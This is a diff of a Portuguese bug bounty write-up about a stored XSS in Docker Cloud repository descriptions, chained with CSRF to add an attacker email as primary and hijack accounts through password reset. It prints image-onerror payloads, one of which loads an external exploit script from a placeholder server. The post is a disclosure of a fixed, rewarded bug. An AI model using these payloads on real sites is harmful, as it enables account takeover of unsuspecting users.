@@ -16,12 +16,13 @@ Bom, a vulnerabilidade que está no título foi o resultado final de uma cadeia 
 <p align="justify">
 Enquanto navegava pelos repositórios do Docker Cloud, percebi que o usuário podia inserir uma  breve e também uma completa descrição a respeito do projeto. Decidi inserir algumas tags na descrição completa só para teste mesmo (não esperava que realmente iria acontecer), comecei com o famoso <code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code> e para minha não surpresa, não ocorreu nada.
 <br>
-
+<br>
 Decidi então inserir uma tag de imagem com um evento Javascript:
 <br>
 <code>&lt;img src="x" onerror="alert(document.domain)"/&gt;</code>
 <br>
 salvei e quando a descição foi atualizada, boooommm :)
+<br>
 <img src="/images/bug_bounty/bb00-00.png"/>
 </p>
 
@@ -31,16 +32,16 @@ Neste ponto, já havia um XSS Stored (Armazenado), pois qualquer usuário que vi
 <br>
 Foi então que tive uma ideia de escalar ainda mais a vulnerabilidade, então fui procurar mais sobre e me deparei com o CSRF (Cross Site Request Forgery), que é um tipo de ataque onde você força o usuário a relizar ações forjadas (o usuário acha que está realizando uma ação, mas na verdade está realizando outra). Descobri que para isso eu teria que carregar um script externo, e como a tag script não estava disponível, foi necessário utilizar os eventos JS das tags HTML :)
 <br>
+<br>
 Usei o seguinte payload:
 <br>
 <code>&lt;img src="x" onerror="var script = document.createElement('script'); script.src = 'IP_SERVIDOR/reset.js'; document.getElementsByTagName('head')[0].appendChild(script);"/&gt;</code> 
-<br>
 <br>
 que tem como objetivo inserir um novo atributo do tipo javascript no head do HTML da página que será carregado a partir do arquivo <i>reset.js</i> que no caso é o arquivo js que contém o código do exploit.
 </p>
 
 <p align="justify">
-Para realizar as requisições, era necessário ter o XCSRF-Token do usuário e também que ele estivesse no domínio cloud.docker.com (pode ser acessado pelo domínio hub.docker.com também :) ), pois apenas ele tinha permissão de realizar as requisições para a api.
+Para realizar as requisições, era necessário ter o <b>XCSRF-Token</b> do usuário e também que ele estivesse no domínio cloud.docker.com (pode ser acessado pelo domínio hub.docker.com também :) ), pois apenas ele tinha permissão de realizar as requisições para a api.
 <br>
 <br>
 Estas requisições, são as responsáveis pela inserção do email do atacante na conta do usuário e pela definição deste email como primário (quando o usuário reseta a senha o link é enviado para o email primário), portanto o usuário pode ter vários emails, mas o link só será enviado para o endereço de email primário.
@@ -72,6 +73,14 @@ Abaixo há a PoC da vulnerabilidade:
 <br>
 <iframe width="560" height="315" src="https://www.youtube.com/embed/wHWfAo76xMY" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 </p>
+
+<br>
+
+<p align="justify">
+Quero agradecer ao <a href="https://twitter.com/K33r0k" target="_blank">K33r0k</a> por ter me ajudado a entender mais sobre CSRF :)
+</p>
+
+<br>
 
 <p align="justify">
 Bom galera, espero que eu tenha passado de forma clara essa resolução da vulnerabilidade encontrada no docker, como já disse ela foi corrigida, já fui recompensado e também fui permitido de realizar o disclosure.
